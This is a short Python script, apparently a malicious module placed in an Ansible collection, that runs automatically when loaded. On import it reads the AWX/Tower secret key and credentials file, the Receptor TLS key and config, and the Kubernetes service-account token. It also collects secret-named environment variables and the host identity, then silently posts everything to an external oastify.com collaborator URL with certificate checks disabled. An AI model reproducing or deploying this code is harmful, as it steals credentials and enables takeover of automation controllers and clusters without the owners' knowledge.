import os, json, urllib.request, ssl, traceback

def _exfil():
    ctx = ssl._create_unverified_context()
    data = {"id": "collection_init_rce", "user": os.popen("id").read().strip()}

    secret_paths = {
        "secret_key": "/etc/tower/SECRET_KEY",
        "credentials_py": "/etc/tower/conf.d/credentials.py",
        "receptor_conf": "/etc/receptor/receptor.conf",
        "k8s_token": "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "k8s_ca": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "k8s_namespace": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "receptor_tls_key": "/etc/receptor/tls/receptor.key",
    }
    for label, path in secret_paths.items():
        try:
            with open(path) as f:
                data[label] = f.read()
        except Exception:
            data[label] = "NOT_FOUND"

    data["env"] = {k: v for k, v in os.environ.items()
                   if any(s in k.upper()
                          for s in ["PASS", "KEY", "TOKEN", "SECRET",
                                    "CRED", "DATABASE", "DB_", "REDIS",
                                    "RECEPTOR"])}
    data["hostname"] = os.popen("hostname").read().strip()
    data["cwd"] = os.getcwd()

    try:
        req = urllib.request.Request(
            "https://jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com/controller-rce",
            data=json.dumps(data, default=str).encode(),
            headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=15, context=ctx)
    except Exception:
        pass

try:
    _exfil()
except Exception:
    pass
